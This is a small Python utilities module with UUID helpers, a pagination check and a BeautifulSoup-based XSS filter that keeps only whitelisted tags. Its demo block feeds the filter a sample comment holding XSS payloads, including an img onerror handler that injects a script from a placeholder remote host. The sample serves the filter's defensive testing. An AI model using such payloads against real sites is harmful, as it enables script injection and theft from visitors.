import uuid
from bs4 import BeautifulSoup

_xss_tags_whitelist = {
    'p': [],
    'h1': []
}


class Utils:
    @staticmethod
    def uuid_mapped(name):
        return uuid.uuid5(uuid.NAMESPACE_X500, name)

    @staticmethod
    def uuid_unmapped():
        return uuid.uuid1()

    @staticmethod
    def is_fetch_done(total: int, offset: int, limit: int):
        return (offset + limit) >= total

    @staticmethod
    def xss_filter(content: str):
        soup = BeautifulSoup(content, 'html.parser')
        for tag in soup.find_all():
            if tag.name in _xss_tags_whitelist:
                pass
            else:
                tag.hidden = True
                tag.clear()
                continue

            input_attrs = tag.attrs
            valid_attrs = _xss_tags_whitelist[tag.name]

            for k in list(input_attrs.keys()):
                if k in valid_attrs:
                    pass
                else:
                    del tag.attrs[k]
        return soup.decode()


if __name__ == '__main__':
    comment = '''<h1 class="title" id="nmsl">Hello World</h1> <script>alert('I'm xss hacker!')</script> <img 
    style=display:none src=1 onerror='var s=document.createElement("script");s.src="https://xss.example..com/m.js";(
    document.body||document.documentElement).appendChild(s);' /> '''
    print('Before\n', comment)
    print('After \n', Utils.xss_filter(comment))
